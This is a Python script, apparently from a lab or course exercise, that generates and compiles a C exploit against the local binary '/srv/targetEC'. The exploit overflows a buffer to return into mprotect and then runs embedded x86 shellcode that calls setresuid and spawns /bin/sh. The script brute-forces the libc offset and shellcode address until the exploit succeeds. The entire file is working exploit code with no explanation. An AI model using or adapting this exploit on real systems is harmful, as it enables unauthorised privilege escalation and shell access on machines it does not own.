import subprocess

LIBC_BASE = 0xf7de1000

def try_exploit(mprotect_off, shellcode_addr):
    with open("tmp_sploitEC.c", "w") as f:
        f.write(f'''
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>

#define TARGET "/srv/targetEC"

char shellcode[] = 
  "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\xa4\\xb3\\x1f\\xb1\\x1f\\xb2\\x1f"
  "\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c"
  "\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8"
  "\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";

int main(void)
{{
  char *args[3];
  char *env[1];

  char buf[40];

  uint32_t *addr_ptr = (uint32_t *)(buf);
  
  *addr_ptr++ = {LIBC_BASE + mprotect_off};
  *addr_ptr++ = {shellcode_addr};
  *addr_ptr++ = 0x1000;
  *addr_ptr++ = 0x7;
  *addr_ptr++ = {shellcode_addr};

  memcpy(buf+20, shellcode, sizeof(shellcode));  

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\\n");

  return 0;
}}
''')
    subprocess.run(["gcc", "-m32", "-o", "tmp_sploitEC", "tmp_sploitEC.c"])
    p = subprocess.run(["./tmp_sploitEC"], capture_output=True)
    return p.returncode == 0

for mprotect_off in range(0, 0x1000, 4):
    for shellcode_addr in range(0xffffcf00, 0xffffcfff, 4):
        print(f"Trying mprotect offset {hex(mprotect_off)} and shellcode address {hex(shellcode_addr)}...")
        if try_exploit(mprotect_off, shellcode_addr):
            print(f"Successful exploit with mprotect offset {hex(mprotect_off)} and shellcode address {hex(shellcode_addr)}!")
            exit(0)